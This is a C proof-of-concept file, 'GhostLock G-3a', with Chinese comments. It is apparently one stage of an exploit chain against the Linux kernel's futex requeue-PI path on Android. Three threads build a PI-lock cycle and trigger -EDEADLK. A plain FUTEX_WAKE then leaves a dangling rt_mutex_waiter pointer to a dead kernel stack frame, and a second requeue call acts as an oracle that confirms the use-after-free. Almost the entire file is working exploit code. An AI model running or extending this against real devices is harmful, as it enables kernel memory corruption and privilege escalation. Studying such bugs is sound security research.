/*
 * g3_free.c — GhostLock G-3a：让栈帧死亡而悬垂指针留存（真正的 UAF 起点）
 *
 * 关键依据（futex.c:2794-2809）：
 *   handle_early_requeue_pi_wakeup() 在 `!match_futex(&q->key, key2)` 时
 *   （即 requeue 失败、q->key 仍指向 A）会 plist_del 并把 ret 置为
 *   -EWOULDBLOCK / -ERESTARTNOINTR，调用者随即 goto out_put_keys 返回，
 *   **不经过 rt_mutex_finish_proxy_lock()，因此也不会调用 remove_waiter()**。
 *
 *   ⇒ 对 A 做一次普通 FUTEX_WAKE，W 返回用户态、内核栈帧弹出，
 *     而 W->pi_blocked_on 仍指向那个已失效的 rt_mutex_waiter。
 *
 * 步骤：
 *   [1] 三锁环触发 -EDEADLK（G-1/G-2c 已验证，稳定命中）
 *   [2] FUTEX_WAKE(A, 1) → W 应带着 -EWOULDBLOCK 返回（栈帧死亡）
 *   [3] oracle：再次 CMP_REQUEUE_PI(A2→C)
 *         -EDEADLK → 指针仍在（已指向失效栈帧 = 真 UAF）
 *         >=0      → 指针已被清除
 *
 * 风险：栈帧已弹出，oracle 的链走查会解引用可能已被复用的栈内存。
 *       按最坏情况处理：每步 fsync、结束即 _exit。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3.log"

#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A, A2, B, C;
	volatile int b_held, c_held, o_blocked, w_waiting, w_returned;
	volatile int w2_waiting;
	volatile int w_go_next;
	volatile long w_ret;
	volatile int w_errno;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno);
		return NULL;
	}
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: WAIT_REQUEUE_PI(A→C)");
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	S->w_ret = r;
	S->w_errno = errno;
	S->w_returned = 1;
	__sync_synchronize();
	lg("W: 返回 %ld errno=%d (%s) ← 栈帧此刻起失效",
	   r, S->w_errno, strerror(S->w_errno));

	/* 纯用户态自旋：不发任何 syscall，避免立即复用内核栈覆盖掉那个 waiter */
	while (!S->w_go_next)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno);
		return NULL;
	}
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: LOCK_PI(B)（阻塞，形成环）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_w2(void *arg)
{
	long r;
	(void)arg;
	S->w2_waiting = 1;
	__sync_synchronize();
	lg("W2: WAIT_REQUEUE_PI(A2→C)");
	errno = 0;
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W2: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-3a start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->A2 = S->B = S->C = 0;

	/* [1] 触发 */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[1] CMP_REQUEUE_PI(A→C,1) → %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();
	if (!(r == -1 && e == EDEADLK)) {
		lg("[1] 未命中，终止");
		sync_log();
		_exit(2);
	}

	/* [2] 普通 FUTEX_WAKE 唤醒 W：应走 handle_early_requeue_pi_wakeup 的早退分支 */
	lg("[2] FUTEX_WAKE(A, 1) —— 期望 W 以 -EWOULDBLOCK 返回，且不触发 remove_waiter");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_WAKE | FUTEX_PRIVATE_FLAG, 1, NULL, NULL, 0);
	lg("[2] FUTEX_WAKE 返回 %ld errno=%d", r, errno);

	{
		int spin = 0;
		while (!S->w_returned && spin < 2000) {
			usleep(1000);
			spin++;
		}
	}
	if (!S->w_returned)
		lg("[2] W 未在 2s 内返回");
	else
		lg("[2] W 已返回 ret=%ld errno=%d（帧已弹出）", S->w_ret,
		   S->w_errno);
	sync_log();

	/* [3] oracle */
	pthread_create(&tw2, NULL, thread_w2, NULL);
	{
		int spin = 0;
		while (!S->w2_waiting && spin < 1000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(150000);
	lg("[3] oracle: CMP_REQUEUE_PI(A2→C,1)");
	sync_log();
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[3] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 栈帧已弹出但指针仍在 → **真 UAF**（指向已失效内核栈）");
	else if (r >= 0)
		lg("verdict: 指针已消失（返回 %ld）→ 该出口也会自愈", r);
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	sync_log();
	lg("结束");
	sync_log();
	_exit(0);
}
